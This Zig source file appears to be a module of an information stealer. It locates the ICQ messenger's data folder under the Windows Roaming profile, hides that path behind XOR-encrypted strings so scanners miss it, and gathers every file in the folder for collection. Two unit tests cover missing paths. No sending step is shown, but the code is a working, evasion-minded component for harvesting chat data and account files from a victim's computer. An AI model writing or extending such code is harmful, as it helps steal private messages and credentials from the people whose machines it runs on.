const std = @import("std");
const hash = @import("../types/hash.zig");

const E = struct {
    pub const icq_path = hash.xorEncrypt("ICQ");
    pub const icq_subdir = hash.xorEncrypt("0001");
};

pub fn collect(allocator: std.mem.Allocator, roaming: []const u8) ![][]const u8 {
    var files = std.ArrayList([]const u8).init(allocator);
    errdefer {
        for (files.items) |f| allocator.free(f);
        files.deinit();
    }

    var ico_buf: [E.icq_path.len]u8 = undefined;
    var dir_buf: [E.icq_subdir.len]u8 = undefined;
    hash.xorDecrypt(&E.icq_path, &ico_buf);
    hash.xorDecrypt(&E.icq_subdir, &dir_buf);

    const full_path = std.fs.path.join(allocator, &[_][]const u8{ roaming, ico_buf[0..], dir_buf[0..] }) catch return try allocator.alloc([]const u8, 0);
    defer allocator.free(full_path);

    var dir = std.fs.openDirAbsolute(full_path, .{ .iterate = true }) catch return try allocator.alloc([]const u8, 0);
    defer dir.close();

    var iter = dir.iterate();
    while (iter.next() catch {}) |entry| {
        if (entry.kind != .file) continue;
        const full = try std.fs.path.join(allocator, &[_][]const u8{ full_path, entry.name });
        try files.append(full);
    }

    return files.toOwnedSlice();
}

test "collect returns empty for nonexistent path" {
    const result = try collect(std.testing.allocator, "C:\\__nonexistent__icq");
    defer {
        for (result) |f| std.testing.allocator.free(f);
        std.testing.allocator.free(result);
    }
    try std.testing.expectEqual(@as(usize, 0), result.len);
}

test "collect returns empty for missing subdir" {
    const result = try collect(std.testing.allocator, "C:\\__nonexistent__icq_sub");
    defer {
        for (result) |f| std.testing.allocator.free(f);
        std.testing.allocator.free(result);
    }
    try std.testing.expectEqual(@as(usize, 0), result.len);
}
